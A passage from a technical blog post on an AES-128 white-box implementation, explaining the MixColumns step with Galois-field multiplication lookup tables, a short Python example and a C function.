class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1A</span> <span class="p">}</span>
</span><span class='line'>    <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once you have this magic table, the multiplication gets really easy. Let&rsquo;s take an example:</p>

<p><img class="center" src="http://doar-e.github.io/images/spotlight_on_an_unprotected_aes128_white-box_implementation/mixcolumn_example.png"></p>

<p>As I said, the four bytes at the left are from your state &amp; the 4x4 matrix is the fixed one (filled only with 3 different values). To have the result of this multiplication you just have to execute this:</p>

<figure class='code'><figcaption><span>mult</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">reduce</span><span class="p">(</span><span class="n">operator</span><span class="o">.</span><span class="n">xor</span><span class="p">,</span> <span class="p">[</span><span class="n">gmul</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mh">0xd4</span><span class="p">],</span> <span class="n">gmul</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mh">0xbf</span><span class="p">],</span> <span class="n">gmul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mh">0x5d</span><span class="p">],</span> <span class="n">gmul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mh">0x30</span><span class="p">]])</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first indexes in the table are the actual values taken from the 4x4 matrix minus one (because our array is going to be addressed from index 0). So then you can declare your own 4x4 matrix with proper indexes &amp; do the multiplication four times:</p>

<figure class='code'><figcaption><span>MixColumns</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">MixColumns</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">matrix</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>
</span><span class='line'>        <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'>    <span class="p">},</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// In[19]: reduce(operator.xor, [gmul[1][0xd4], gmul[2][0xbf], gmul[0][0x5d], gmul[0][0x30]])</span>
</span><span class='line'>    <span class="c1">/// Out[19] : 4</span>
</span><span class='line'>    <span class="c1">/// In [20]: reduce(operator.xor, [gmul[0][0xd4], gmul[1][0xbf], gmul[2][0x5d], gmul[0][0x30]])</span>
</span><span class='line'>    <span class="c1">/// Out[20]: 102</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">gmul</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xFF</span> <span class="p">},</span>
</span><span class='line'>        <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span 